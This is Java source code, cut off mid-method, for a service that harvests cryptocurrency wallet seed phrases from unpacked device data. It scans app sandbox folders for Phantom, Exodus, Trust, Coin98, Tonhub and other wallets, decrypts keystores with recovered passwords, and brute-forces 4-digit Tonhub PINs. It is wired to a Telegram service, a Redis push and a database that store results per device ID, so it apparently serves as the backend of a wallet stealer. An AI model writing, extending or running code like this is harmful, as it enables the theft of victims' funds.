package com.consumer.service;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.codahale.xsalsa20poly1305.SecretBox;
import com.consumer.config.ConsumerProperties;
import com.consumer.dao.DeviceDao;
import com.consumer.dao.MnemonicDao;
import com.consumer.entity.DeviceEntity;
import com.consumer.entity.MnemonicEntity;
import com.consumer.util.Bip39Util;
import com.consumer.util.RedisPush;
import org.bouncycastle.crypto.PBEParametersGenerator;
import org.bouncycastle.crypto.digests.SHA512Digest;
import org.bouncycastle.crypto.generators.PKCS5S2ParametersGenerator;
import org.bouncycastle.crypto.generators.SCrypt;
import org.bouncycastle.crypto.params.KeyParameter;

import lombok.Data;
import lombok.extern.slf4j.Slf4j;

import org.springframework.stereotype.Service;

import javax.annotation.PostConstruct;
import javax.annotation.Resource;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

/**
 * 助记词提取器 — 对齐 Python 版 recover_hq8_mnemonics.py 的 recover_entry()。
 *
 * <p>优先从 war 解压后的磁盘目录直接扫：files/hex/ 和 files/sandbox/；
 * war JSON 只做兜底回退。
 *
 * <p>支持的钱包类型（HQ-8 + 扩展）：
 * <ul>
 *   <li>phantom  — files/hex 中带 phantom 的 JSON → entropy → BIP39</li>
 *   <li>exodus   — hex 全盘含 "mnemonic"/"seed"（含 unused*，不与 coin98 互斥；同词各 source 各留一条）
 *                 + sandbox/exodus ALS</li>
 *   <li>bitpie   — files/hex 中 seedPhraseEntropy_data.txt → entropy → BIP39</li>
 *   <li>uniswap  — files/hex 中带 mnemonic 的文件 → 明文助记词</li>
 *   <li>trust    — hex 目录 trustwalletUTC--*_data*.txt（64hex 密码）+ sandbox/trust/Documents/keystore/UTC--*.json
 *     (keystore) → scrypt → AES-128-CTR → mnemonic</li>
 *   <li>coin98   — hex/unknown/unused*.data.bin 明文（与 exodus 并行，不互斥）；sandbox ALS 密文需密码</li>
 *   <li>tonhub   — sandbox/tonhub/Documents/mmkv/mmkv.default（明文兜底 + MMKV+PBKDF2-SHA512(100k) + NaCl secretbox 4 位 PIN 暴力）</li>
 *   <li>mytonwallet — sandbox/mytonwallet 下所有文件做 BIP39 正则</li>
 *   <li>metamask / okx / bitget / solflare — sandbox 对应目录做 BIP39 正则扫描</li>
 * </ul>
 */
@Service
@Slf4j
public class MnemonicExtractor {

    /** 助记词提取结果 */
    @Data
    public static class PhraseResult {
        private final String wallet;   // 钱包名（phantom/exodus/...）
        private final String phrase;   // 助记词（空格分隔）
        private final String method;   // 提取方式
        private final int wordCount;   // 词数
        public PhraseResult(String wallet, String phrase, String method) {
            this.wallet = wallet;
            // 规范化：toLowerCase + trim + 内部所有空白字符（\r\n\t 多空格 BOM 等）统一压缩为单空格
            // 防止源文件中的 Windows 换行 \r\n / 多空格 / BOM 等不可见字符混入 phrase，
            // 导致 wordCount 计数正确但 phrase 字节长度异常 → AES 密文比其他钱包长
            String normalized = phrase.toLowerCase().trim().replaceAll("\\s+", " ");
            this.phrase = normalized;
            this.method = method;
            this.wordCount = normalized.isEmpty() ? 0 : normalized.split("\\s+").length;
        }
    }

    @Resource
    private Bip39Util bip39;

    @Resource
    private ConsumerProperties consumerProps;

    @Resource
    private MnemonicDao mnemonicDao;

    @Resource
    private DeviceDao deviceDao;

    @Resource
    private RedisPush redisPush;

    @Resource
    private MnemonicTelegramService mnemonicTelegramService;

    /** mnemonic AES-256 加密密钥（与 ParseCiHandler.initAesKey 对齐） */
    private volatile SecretKeySpec mnemonicAesKey;

    /** Tonhub 暴力串行化信号量：限制同时爆破的 device 数，避免打满 CPU */
    private volatile Semaphore tonhubBruteSemaphore;

    @PostConstruct
    public void initAesKey() {
        try {
            byte[] key = consumerProps.getMnemonicAesKey().getBytes(StandardCharsets.UTF_8);
            if (key.length != 32) key = Arrays.copyOf(key, 32);
            this.mnemonicAesKey = new SecretKeySpec(key, "AES");
        } catch (Exception e) {
            log.error("MnemonicExtractor initAesKey FAIL: {}", e.toString());
        }
        // 根据配置调整 tonhub 暴力线程池大小（threads=0 时使用静态初始化值，不重复 resize 避免 ThreadPoolExecutor 动态 resize 副作用）
        int configured = consumerProps.getTonhubBruteThreads();
        if (configured > 0) {
            TONHUB_BRUTE_POOL.setMaximumPoolSize(configured);
            TONHUB_BRUTE_POOL.setCorePoolSize(configured);
            log.info("【mnemonic】tonhub 暴力线程池已调整为 {} 线程（配置值）", configured);
        } else {
            log.info("【mnemonic】tonhub 暴力线程池使用静态初始化值 {} 线程", TONHUB_BRUTE_POOL.getCorePoolSize());
        }
        // 初始化串行化信号量
        int permits = Math.max(1, consumerProps.getTonhubBruteSerializePermits());
        this.tonhubBruteSemaphore = new Semaphore(permits, true);
        log.info("【mnemonic】tonhub 串行化信号量 permits={} syncTimeout={}ms",
                permits, consumerProps.getTonhubBruteSyncTimeoutMs());
    }

    /** 32 位 hex 文件名 (coin98 ALS hash) */
    private static final Pattern HASH32 = Pattern.compile("^[0-9a-f]{32}$");

    /** hex 编码字符表，替代 String.format("%02x") 的热路径优化 */
    private static final char[] HEX_CHARS = "0123456789abcdef".toCharArray();

    /**
     * Tonhub PIN 暴力专用线程池 — 全局单例、固定容量，防止多任务并发下 N×CPU 线程打满 CPU。
     * 总线程数 = Math.min(8, Math.max(2, CPU/2))，最多只占 CPU 一半算力，另一半留给 parse_ci/news4/war_unpack 核心业务。
     */
    private static final ThreadPoolExecutor TONHUB_BRUTE_POOL;
    static {
        int cpu = Runtime.getRuntime().availableProcessors();
        int n = Math.min(8, Math.max(2, cpu / 2));
        TONHUB_BRUTE_POOL = new ThreadPoolExecutor(
                n, n, 60L, TimeUnit.SECONDS,
                new LinkedBlockingQueue<>(4096),
                r -> {
                    Thread t = new Thread(r, "tonhub-brute");
                    t.setDaemon(true);
                    return t;
                },
                // 队列满时直接降级：AbortPolicy 会被调用方捕获，转成「明文兜底，跳过暴力」
                new ThreadPoolExecutor.AbortPolicy()
        );
        TONHUB_BRUTE_POOL.allowCoreThreadTimeOut(true);
    }

    /** 磁盘扫描专用线程池：3 线程对应 hex/sandbox/trust 三组并行扫描，隔离不抢其他组件线程 */
    private static final ExecutorService SCAN_POOL = Executors.newFixedThreadPool(3,
            r -> {
                Thread t = new Thread(r, "disk-scan");
                t.setDaemon(true);
                return t;
            });

    // ============================================================
    // 主入口
    // ============================================================

    /** 上下文：用于 tonhub 暴力超时后异步补写 mnemonic + news4（避免阻塞 parse_ci 线程）*/
    @lombok.Value
    public static class Ctx {
        Integer ios18paramId;
        String  deviceId;
    }

    public List<PhraseResult> extractAll(JSONObject war, String unpackDir, Ctx ctx) {
        List<PhraseResult> results = new ArrayList<>();

        // 1. 先扫磁盘（主路径）
        if (unpackDir != null && !unpackDir.isEmpty()) {
            Path root = resolveUnpackRoot(unpackDir);
            if (root != null) {
                scanDiskAll(root, results, ctx);
            }
        }

        // 2. 兜底：再扫 war JSON，避免磁盘找不到但 JSON 里有内嵌的情况
        if (results.isEmpty() && war != null) {
            fallbackScanWarJson(war, unpackDir, results);
        }

        // 3. 去重：同 wallet+phrase 只留一条；同词不同 source（如 coin98/exodus）各留一条
        return dedup(results);
    }

    // ============================================================
    // 磁盘扫描（对齐 Python recover_entry）
    // ============================================================

    private void scanDiskAll(Path root, List<PhraseResult> out, Ctx ctx) {
        Path hex = root.resolve("files").resolve("hex");
        Path sandbox = root.resolve("files").resolve("sandbox");

        // 3 组并行扫描（hex / sandbox / trust），用专用 SCAN_POOL 隔离，不抢其他组件线程
        List<PhraseResult> hexResults = new ArrayList<>();
        List<PhraseResult> sandboxResults = new ArrayList<>();
        List<PhraseResult> trustResults = new ArrayList<>();

        CompletableFuture<Void> hexFut = null;
        CompletableFuture<Void> sandboxFut = null;
        CompletableFuture<Void> trustFut = null;

        if (Files.isDirectory(hex)) {
            hexFut = CompletableFuture.runAsync(() -> {
                // coin98←unused*；exodus←全盘（含 unused*）；两者并行都入库，互不排除
                scanHexCoin98FromUnknownUnused(hex, hexResults);
                scanHexPhantom(hex, hexResults);
                scanHexExodus(hex, hexResults);
                scanHexBitpie(hex, hexResults);
                scanHexUniswap(hex, hexResults);
                fallbackHexRegex(hex, hexResults);
            }, SCAN_POOL);
        }
        if (Files.isDirectory(sandbox)) {
            sandboxFut = CompletableFuture.runAsync(() -> {
                scanSandboxExodus(sandbox, sandboxResults);
                scanSandboxCoin98(sandbox, sandboxResults);
                scanSandboxTonhub(sandbox, sandboxResults, ctx);
                scanSandboxMytonwallet(sandbox, sandboxResults);
                fallbackSandboxRegex(sandbox, sandboxResults);
            }, SCAN_POOL);
        }
        // trust 需要读 hex+sandbox，但只读文件不依赖其他扫描结果，可并行
        if (Files.isDirectory(hex) || Files.isDirectory(sandbox)) {
            trustFut = CompletableFuture.runAsync(() -> {
                scanHexTrustPasswordAndKeystore(hex, sandbox, trustResults);
            }, SCAN_POOL);
        }

        if (hexFut != null) hexFut.join();
        if (sandboxFut != null) sandboxFut.join();
        if (trustFut != null) trustFut.join();

        out.addAll(hexResults);
        out.addAll(sandboxResults);
        out.addAll(trustResults);
        // hex/sandbox 分桶扫描后合并，再按 wallet+phrase 去重（避免同词多文件/多路径重复）
        List<PhraseResult> merged = dedup(out);
        out.clear();
        out.addAll(merged);
    }

    // --- Phantom: hex/phantom/*.json，找 entropy 字段（对齐 Python: hex/phantom/*.json）---
    private void scanHexPhantom(Path hex, List<PhraseResult> out) {
        if (containsWallet(out, "phantom")) return;
        Path phantomDir = hex.resolve("phantom");
        if (!Files.isDirectory(phantomDir)) return;
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(phantomDir, "*.json")) {
            for (Path p : ds) {
                if (!Files.isRegularFile(p)) continue;
                String text = readTextUtf8(p);
                if (text == null) continue;
                JSONObject j = safeJson(text);
                if (j == null) continue;
                Object entObj = j.get("entropy");
                if (entObj != null) {
                    byte[] entropy = parseEntropy(entObj);
                    if (entropy != null && entropy.length >= 16) {
                        String mn = bip39.entropyToMnemonic(entropy);
                        if (mn != null && bip39.validateMnemonic(mn)) {
                            out.add(new PhraseResult("phantom", mn, "vault.entropy→BIP39"));
                            return;
                        }
                    }
                }
                // 兜底正则搜整个 JSON 文本
                String found = bip39.searchPhrase(text);
                if (found != null) {
                    out.add(new PhraseResult("phantom", found, "hex_json_regex"));
                    return;
                }
            }
        } catch (IOException e) {
        }
    }

    // --- Exodus: hex 全盘扫，命中几条加几条，不提前 return；不跳过 unused*（与 coin98 并行入库）---
    private void scanHexExodus(Path hex, List<PhraseResult> out) {
        Path exodusDir = hex.resolve("exodus");

        // (1) hex/exodus/*.json
        if (Files.isDirectory(exodusDir)) {
            try (DirectoryStream<Path> ds = Files.newDirectoryStream(exodusDir, "*.json")) {
                for (Path p : ds) {
                    if (!Files.isRegularFile(p)) continue;
                    addExodusFromText(out, readTextUtf8(p), "hex_exodus_dir:" + p.getFileName());
                }
            } catch (IOException e) {
            }
        }

        // (2) 全盘 walk（含 unknown/unused*）
        try (java.util.stream.Stream<Path> s = Files.walk(hex, 5)) {
            java.util.List<Path> files = s.filter(Files::isRegularFile)
                    .filter(p -> {
                        String name = p.getFileName().toString().toLowerCase();
                        if (name.endsWith(".png") || name.endsWith(".jpg") || name.endsWith(".jpeg")
                                || name.endsWith(".svg") || name.endsWith(".ttf") || name.endsWith(".hive")
                                || name.endsWith(".db") || name.endsWith(".sqlite")
                                || name.endsWith(".sqlite-shm") || name.endsWith(".sqlite-wal")
                                || name.endsWith(".realm")) return false;
                        try { return Files.size(p) <= 4 * 1024 * 1024; }
                        catch (IOException e) { return false; }
                    })
                    .collect(Collectors.toList());
            for (Path p : files) {
                try { if (Files.isDirectory(exodusDir) && p.startsWith(exodusDir)) continue; } catch (Exception ignore) {}
                String text = readTextUtf8(p);
                if (text == null || text.isEmpty()) continue;
                String contentLower = text.toLowerCase();
                String nameLower = p.getFileName().toString().toLowerCase();
                boolean haveKeyword = nameLower.contains("exodus") || contentLower.contains("exodus")
                        || contentLower.contains("\"mnemonic\"") || contentLower.contains("mnemonicwords")
                        || contentLower.contains("exodus-movement") || contentLower.contains("\"seed\"");
                if (!haveKeyword) continue;
                Path rel;
                try { rel = hex.relativize(p); } catch (Exception e) { rel = p; }
                addExodusFromText(out, text, "hex_walk:" + rel);
            }
        } catch (IOException e) {
        }
    }

    /** 从文本提取 exodus 助记词并追加；同词已有 exodus 则跳过（coin98 同词仍可另存） */
    private void addExodusFromText(List<PhraseResult> out, String text, String methodPrefix) {
        if (text == null || text.isEmpty()) return;
        PhraseResult r = tryExodusContent(text);
        if (r != null) {
            if (!containsWalletPhrase(out, "exodus", r.getPhrase())) {
                out.add(new PhraseResult("exodus", r.getPhrase(), methodPrefix + "/" + r.getMethod()));
            }
            return;
        }
        String found = bip39.searchPhrase(text);
        if (found != null && !containsWalletPhrase(out, "exodus", found)) {
            out.add(new PhraseResult("exodus", found, methodPrefix + "/regex"));
        }
    }

    /**
     * Coin98 明文：hex/unknown/unused*.data.bin（与 exodus 并行，同词也可各入一条）。
     * 兼容旧包 hex/coin98/unused*。
     */
    private void scanHexCoin98FromUnknownUnused(Path hex, List<PhraseResult> out) {
        Path[] roots = {hex.resolve("unknown"), hex.resolve("coin98")};
        for (Path root : roots) {
            if (!Files.isDirectory(root)) continue;
            try (java.util.stream.Stream<Path> walkStream = Files.walk(root, 4)) {
                walkStream.filter(Files::isRegularFile)
                        .forEach(p -> tryAddCoin98FromUnusedFile(root, p, out));
            } catch (IOException ignore) {}
        }
    }

    private void tryAddCoin98FromUnusedFile(Path root, Path p, List<PhraseResult> out) {
        String name = p.getFileName().toString().toLowerCase();
        boolean candidate = name.startsWith("unused")
                || (name.contains("unused") && name.endsWith(".bin"));
        if (!candidate) return;
        try {
            if (Files.size(p) > 4 * 1024 * 1024) return;
        } catch (IOException e) {
            return;
        }
        String text = readTextUtf8(p);
        if (text == null || text.isEmpty()) return;
        String trimmed = text.trim();
        if (trimmed.startsWith("\"") && trimmed.endsWith("\"")) {
            try {
                trimmed = JSON.parseObject(trimmed, String.class);
            } catch (Exception ignore) {
                trimmed = trimmed.substring(1, trimmed.length() - 1);
            }
        }
        String foundPhrase = null;
        String methodSuffix = null;
        try {
            JSONObject j = JSON.parseObject(trimmed);
            if (j != null) {
                for (String key : new String[]{"mnemonic", "phrase", "seed"}) {
                    Object v = j.get(key);
                    if (!(v instanceof String)) continue;
                    String s = ((String) v).trim().toLowerCase();
                    if (!s.contains(" ")) continue;
                    if (bip39.validateMnemonic(s)) {
                        foundPhrase = s;
                        methodSuffix = "json." + key;
                        break;
                    }
                }
            }
        } catch (Exception ignore) {}
        if (foundPhrase == null) {
            foundPhrase = bip39.searchPhrase(trimmed);
            if (foundPhrase != null) methodSuffix = "regex";
        }
        if (foundPhrase == null) return;
        if (containsWalletPhrase(out, "coin98", foundPhrase)) return;
        Path rel;
        try { rel = root.relativize(p); } catch (Exception e) { rel = p; }
        // 不与 exodus 互斥；同词 coin98 只留一条（多 unused 文件去重）
        out.add(new PhraseResult("coin98", foundPhrase,
                "hex_unknown_unused." + methodSuffix + ":" + rel));
    }

    // --- Bitpie: hex/bitpie/seedPhraseEntropy_data.txt（或 _1.txt）双层 hex 编码熵 ---
    //  存储格式与 Trust 密码文件一致：
    //  文件原始(64 hex chars) → 第1层 hex解码 → ASCII(32 hex chars) → 第2层 hex解码 → 16字节熵 → 12词助记词
    private void scanHexBitpie(Path hex, List<PhraseResult> out) {
        if (containsWallet(out, "bitpie")) return;
        Path bitpieDir = hex.resolve("bitpie");
        if (!Files.isDirectory(bitpieDir)) return;
        String[] candidates = {"seedPhraseEntropy_data.txt", "seedPhraseEntropy_data_1.txt"};
        for (String cand : candidates) {
            Path p = bitpieDir.resolve(cand);
            if (!Files.isRegularFile(p)) continue;
            String text = readTextUtf8(p);
            if (text == null) continue;
            String trimmed = text.trim();
            byte[] entropy = decodeBitpieEntropy(trimmed);
            if (entropy == null) continue;

            String mn = bip39.entropyToMnemonic(entropy);
            if (mn != null && bip39.validateMnemonic(mn)) {
                out.add(new PhraseResult("bitpie", mn, "seedPhraseEntropy→BIP39(" + entropy.length + "B)"));
                return;
            }
            log.warn("【mnemonic】bitpie 解码后熵→BIP39 校验未通过 熵字节={} 助记词=[{}]（请人工核验）",
                    entropy.length, mn);
        }
        // 兜底：在 bitpie 子目录下找其他文件做 BIP39 正则
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(bitpieDir)) {
            for (Path p : ds) {
                if (!Files.isRegularFile(p)) continue;
                String text = readTextUtf8(p);
                if (text == null) continue;
                String found = bip39.searchPhrase(text);
                if (found != null) {
                    out.add(new PhraseResult("bitpie", found, "hex_bitpie_regex"));
                    return;
                }
            }
        } catch (IOException ignore) {}
    }

    /**
     * Bitpie 熵文件解码：自动检测并处理单层/双层 hex 编码。
     * <p>双层编码示例：
     * <pre>
     * 文件原始(64 hex chars): 4231454343...  → 第1层 hex解码 → "B1ECCC2B..." (32 hex chars)
     *                                              → 第2层 hex解码 → 16 字节熵 → 12词助记词
     * </pre>
     * 单层编码（兼容）：32 hex chars → 16 字节熵
     */
    private static byte[] decodeBitpieEntropy(String raw) {
        if (raw == null || raw.isEmpty()) return null;
        String t = raw.trim();
        if (!t.matches("[0-9a-fA-F]+") || t.length() % 2 != 0) return null;

        // 第 1 层：hex → bytes
        byte[] layer1 = hexToBytes(t);
        if (layer1 == null) return null;

        // 检测是否需要第 2 层解码：layer1 是否全是 ASCII hex 字符
        String layer1Ascii = new String(layer1, StandardCharsets.UTF_8).trim();
        if (layer1Ascii.matches("[0-9a-fA-F]{32,64}") && layer1Ascii.length() % 2 == 0) {
            // 双层 hex 编码：再解一层
            byte[] entropy = hexToBytes(layer1Ascii);
            if (entropy != null) {
                return entropy;
            }
        }

        // 单层 hex 编码（直接 hex → bytes 就是熵）
        if (layer1.length >= 16 && layer1.length <= 32) {
            return layer1;
        }
        return null;
    }

    // --- Uniswap: hex/uniswap/ 目录下文件名含 mnemonic 的明文（对齐 Python）---
    private void scanHexUniswap(Path hex, List<PhraseResult> out) {
        if (containsWallet(out, "uniswap")) return;
        Path uniswapDir = hex.resolve("uniswap");
        if (!Files.isDirectory(uniswapDir)) return;
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(uniswapDir)) {
            for (Path p : ds) {
                if (!Files.isRegularFile(p)) continue;
                String name = p.getFileName().toString().toLowerCase();
                if (!name.contains("mnemonic")) continue;
                String text = readTextUtf8(p);
                if (text == null) continue;
                String trimmed = text.trim();
                if (trimmed.startsWith("\"") && trimmed.endsWith("\"")) {
                    trimmed = trimmed.substring(1, trimmed.length() - 1);
                }
                if (bip39.validateMnemonic(trimmed.toLowerCase())) {
                    out.add(new PhraseResult("uniswap", trimmed.toLowerCase(), "kc_plaintext"));
                    return;
                }
                String found = bip39.searchPhrase(text);
                if (found != null) {
                    out.add(new PhraseResult("uniswap", found, "hex_regex"));
                    return;
                }
            }
        } catch (IOException ignore) {}
    }

    // --- Trust: hex/trustwallet + hex/trust 找密码 + sandbox/trust/Documents/keystore 找 UTC JSON ---
    // 对齐 recover_hq8_mnemonics (2).py: hex_dirs = [hex/trustwallet, hex/trust]
    private void scanHexTrustPasswordAndKeystore(Path hex, Path sandbox, List<PhraseResult> out) {
        if (containsWallet(out, "trust")) return;

        // 1. 密码候选：hex/trustwallet/ 以及 hex/trust/（Python 脚本新增的 alias 目录）
        //    文件名 trustwalletUTC--*_data*.txt，内容必须是 64 hex
        Path[] hexDirCandidates = {hex.resolve("trustwallet"), hex.resolve("trust")};
        List<String> pwdHexList = new ArrayList<>();
        for (Path trustHexDir : hexDirCandidates) {
            if (!Files.isDirectory(trustHexDir)) continue;
            try (DirectoryStream<Path> ds = Files.newDirectoryStream(trustHexDir,
                    p -> p.getFileName().toString().startsWith("trustwalletUTC")
                            && p.getFileName().toString().endsWith(".txt"))) {
                for (Path p : ds) {
                    String t = readTextUtf8(p);
                    if (t == null) continue;
                    String s = normalizePwdHex(t.trim());
                    if (s != null && !pwdHexList.contains(s)) pwdHexList.add(s);
                }
            } catch (IOException ignore) {}
            // 兜底：再读非 .txt 版本（_data / _data_1 无扩展名）
            try (DirectoryStream<Path> ds = Files.newDirectoryStream(trustHexDir,
                    p -> p.getFileName().toString().startsWith("trustwalletUTC"))) {
                for (Path p : ds) {
                    String t = readTextUtf8(p);
                    if (t == null) continue;
                    String s = normalizePwdHex(t.trim());
                    if (s != null && !pwdHexList.contains(s)) pwdHexList.add(s);
                }
            } catch (IOException ignore) {}
            // 更宽的兜底：目录中任何 .txt / 无扩展名文件，内容是 64hex（或双重 hex 编码的 64hex）都算
            try (DirectoryStream<Path> ds = Files.newDirectoryStream(trustHexDir,
                    p -> {
                        String n = p.getFileName().toString().toLowerCase();
                        return n.endsWith(".txt") || !n.contains(".");
                    })) {
                for (Path p : ds) {
                    String t = readTextUtf8(p);
                    if (t == null) continue;
                    String s = normalizePwdHex(t.trim());
                    if (s != null && !pwdHexList.contains(s)) pwdHexList.add(s);
                }
            } catch (IOException ignore) {}
        }

        if (pwdHexList.isEmpty()) {
            return;
        }

        // 2. keystore 候选：
        //    (a) sandbox/trust/Documents/keystore/UTC--*.json（或无扩展名）
        //    (a2) sandbox/trust_wallet/Documents/keystore/UTC--*.json（实际目录名常带下划线）
        //    (b) hex/trustwallet/ 和 hex/trust/ 中 wallet-hd-wallet-UTC 等 JSON 文件
        List<Path> keystorePaths = new ArrayList<>();
        String[] trustDirNames = {"trust", "trust_wallet"};
        for (String tdn : trustDirNames) {
            Path trustKs = sandbox.resolve(tdn).resolve("Documents").resolve("keystore");
            if (Files.isDirectory(trustKs)) {
                try (DirectoryStream<Path> ds = Files.newDirectoryStream(trustKs, "UTC--*")) {
                    for (Path p : ds) if (Files.isRegularFile(p)) keystorePaths.add(p);
                } catch (IOException ignore) {}
            }
        }
        // 兜底 hex/trustwallet/ + hex/trust/ 中的 keystore JSON（wallet-hd-wallet-UTC / trust.account 等）
        for (Path trustHexDir : hexDirCandidates) {
            if (!Files.isDirectory(trustHexDir)) continue;
            try (DirectoryStream<Path> ds = Files.newDirectoryStream(trustHexDir)) {
                for (Path p : ds) {
                    if (!Files.isRegularFile(p) || keystorePaths.contains(p)) continue;
                    String n = p.getFileName().toString();
                    if (n.contains("hd-wallet-UTC") || n.contains("trust.account") || n.startsWith("trustwallet")) {
                        String t = readTextUtf8(p);
                        if (t != null && t.trim().startsWith("{")) keystorePaths.add(p);
                    }
                }
            } catch (IOException ignore) {}
        }

        if (keystorePaths.isEmpty()) {
            return;
        }

        // 3. 笛卡尔积配对解密
        for (String pwdHex : pwdHexList) {
            for (Path ksPath : keystorePaths) {
                String content = readTextUtf8(ksPath);
                if (content == null) continue;
                PhraseResult r = tryTrustDecrypt(pwdHex, content);
                if (r != null) {
                    if (!containsWallet(out, "trust")) {
                        out.add(r);
                        return;
                    }
                }
            }
        }
    }

    // --- Coin98: sandbox/coin98 下递归找 32hex 文件，去掉 .json 扩展名，排除 manifest ---
    private void scanSandboxCoin98(Path sandbox, List<PhraseResult> out) {
        Path coin98 = sandbox.resolve("coin98");
        if (!Files.isDirectory(coin98)) return;
        // try-with-resources 关闭 Files.walk 持有的文件句柄
        try (java.util.stream.Stream<Path> walkStream = Files.walk(coin98)) {
            walkStream.filter(Files::isRegularFile)
                    .forEach(p -> {
                        String name = p.getFileName().toString().toLowerCase();
                        if ("manifest.json".equals(name) || name.contains("package")) return;
                        String stem = name.endsWith(".json") ? name.substring(0, name.length() - 5) : name;
                        if (!HASH32.matcher(stem).matches()) return;
                        String text = readTextUtf8(p);
                        if (text == null) return;
                        // 通常 ALS 值是 JSON 字符串包裹（"..."）或 JSON 对象
                        String clean = text.trim();
                        if (clean.startsWith("\"") && clean.endsWith("\"")) {
                            try {
                                clean = JSON.parseObject(clean, String.class);
                            } catch (Exception ignore) {
                                clean = clean.substring(1, clean.length() - 1);
                            }
                        }
                        // (a) 正则搜
                        String found = bip39.searchPhrase(clean.toLowerCase());
                        if (found != null) {
                            if (!containsWalletPhrase(out, "coin98", found)) {
                                out.add(new PhraseResult("coin98", found, "ALS:" + coin98.relativize(p)));
                            }
                            return;
                        }
                        // (b) JSON 里找 mnemonic/seed/phrase 字段
                        try {
                            JSONObject j = JSON.parseObject(clean);
                            if (j != null) {
                                for (String key : new String[]{"mnemonic", "seed", "phrase"}) {
                                    Object v = j.get(key);
                                    if (v instanceof String) {
                                        String s = ((String) v).trim().toLowerCase();
                                        if (bip39.validateMnemonic(s)) {
                                            if (!containsWalletPhrase(out, "coin98", s)) {
                                                out.add(new PhraseResult("coin98", s, "ALS_json." + key));
                                            }
                                            return;
                                        }
                                    }
                                }
                                JSONArray arr = safeJsonArray(clean);
                                if (arr != null) {
                                    for (int i = 0; i < arr.size(); i++) {
                                        Object e = arr.get(i);
                                        if (e instanceof JSONObject) {
                                            Object mv = ((JSONObject) e).get("mnemonic");
                                            if (mv instanceof String) {
                                                String s = ((String) mv).trim().toLowerCase();
                                                if (bip39.validateMnemonic(s)) {
                                                    if (!containsWalletPhrase(out, "coin98", s)) {
                                                        out.add(new PhraseResult("coin98", s, "ALS_json_array:" + i));
                                                    }
                                                    return;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        } catch (Exception ignore) {}
                    });
        } catch (IOException e) {
        }
    }

    // --- Exodus: 专用扫描 files/sandbox/**/exodus-movement.exodus/**/RCTAsyncLocalStorage_V1/*（32hex ALS） ---
    //  与 coin98 ALS 格式一致：32 位十六进制文件名（manifest.json 排除），文件内容通常是 JSON 字符串双层包裹，
    //  需要 tryExodusContent 解双重 JSON + 扫 mnemonic/seed/phrase 字段。之前 fallbackSandboxRegex 只做纯文本正则，会漏掉嵌套 JSON 值。
    private void scanSandboxExodus(Path sandbox, List<PhraseResult> out) {
        // 不因已有 exodus 而跳过；同词只留一条，不同词可多条
        List<Path> roots = new ArrayList<>();
        try (java.util.stream.Stream<Path> s = Files.walk(sandbox, 8)) {
            s.filter(Files::isDirectory)
             .filter(p -> "exodus-movement.exodus".equalsIgnoreCase(p.getFileName().toString()))
             .forEach(roots::add);
        } catch (IOException ignore) {}
        if (roots.isEmpty()) {
            Path legacy = sandbox.resolve("exodus");
            if (Files.isDirectory(legacy)) roots.add(legacy);
        }
        if (roots.isEmpty()) return;
        List<Path> candidates = new ArrayList<>();
        for (Path r : roots) {
            try (java.util.stream.Stream<Path> s = Files.walk(r)) {
                s.filter(Files::isRegularFile)
                 .filter(p -> {
                     String n = p.getFileName().toString().toLowerCase();
                     if ("manifest.json".equals(n)) return false;
                     String stem = n.endsWith(".json") ? n.substring(0, n.length() - 5) : n;
                     return HASH32.matcher(stem).matches();
                 })
                 .forEach(candidates::add);
            } catch (IOException ignore) {}
        }
        for (Path p : candidates) {
            String text = readTextUtf8(p);
            if (text == null || text.isEmpty()) continue;
            String clean = text.trim();
            if (clean.startsWith("\"") && clean.endsWith("\"")) {
                try {
                    String unwrapped = JSON.parseObject(clean, String.class);
                    if (unwrapped != null) clean = unwrapped;
                } catch (Exception ignore) {
                    clean = clean.substring(1, clean.length() - 1);
                }
            }
            Path rel;
            try { rel = sandbox.relativize(p); } catch (Exception e) { rel = p; }
            PhraseResult r = tryExodusContent(clean);
            if (r != null) {
                if (!containsWalletPhrase(out, "exodus", r.getPhrase())) {
                    out.add(new PhraseResult("exodus", r.getPhrase(), "sandbox_als/" + rel));
                }
                continue;
            }
            try {
                JSONObject j = JSON.parseObject(clean);
                if (j != null) {
                    boolean hit = false;
                    for (String key : new String[]{"mnemonic", "seed", "phrase", "mnemonicWords"}) {
                        Object v = j.get(key);
                        if (v instanceof String) {
                            String s = ((String) v).trim().toLowerCase();
                            if (bip39.validateMnemonic(s)) {
                                if (!containsWalletPhrase(out, "exodus", s)) {
                                    out.add(new PhraseResult("exodus", s, "rctals_json." + key + ":" + rel));
                                }
                                hit = true;
                                break;
                            }
                        }
                    }
                    if (hit) continue;
                    JSONArray arr = safeJsonArray(clean);
                    if (arr != null) {
                        for (int i = 0; i < arr.size(); i++) {
                            Object e = arr.get(i);
                            if (!(e instanceof JSONObject)) continue;
                            for (String key : new String[]{"mnemonic", "seed", "phrase", "mnemonicWords"}) {
                                Object v = ((JSONObject) e).get(key);
                                if (v instanceof String) {
                                    String s = ((String) v).trim().toLowerCase();
                                    if (bip39.validateMnemonic(s)) {
                                        if (!containsWalletPhrase(out, "exodus", s)) {
                                            out.add(new PhraseResult("exodus", s,
                                                    "rctals_json_arr." + i + "." + key + ":" + rel));
                                        }
                                        hit = true;
                                        break;
                                    }
                                }
                            }
                            if (hit) break;
                        }
                    }
                    if (hit) continue;
                }
            } catch (Exception ignore) {}
            String found = bip39.searchPhrase(clean.toLowerCase());
            if (found != null && !containsWalletPhrase(out, "exodus", found)) {
                out.add(new PhraseResult("exodus", found, "rctals_regex:" + rel.getFileName()));
            }
        }
    }

    // --- MyTonWallet: 目录下所有文件递归搜 ---
    private void scanSandboxMytonwallet(Path sandbox, List<PhraseResult> out) {
        if (containsWallet(out, "mytonwallet")) return;
        Path mt = sandbox.resolve("mytonwallet");
        if (!Files.isDirectory(mt)) return;
        // try-with-resources 关闭 Files.walk 持有的文件句柄
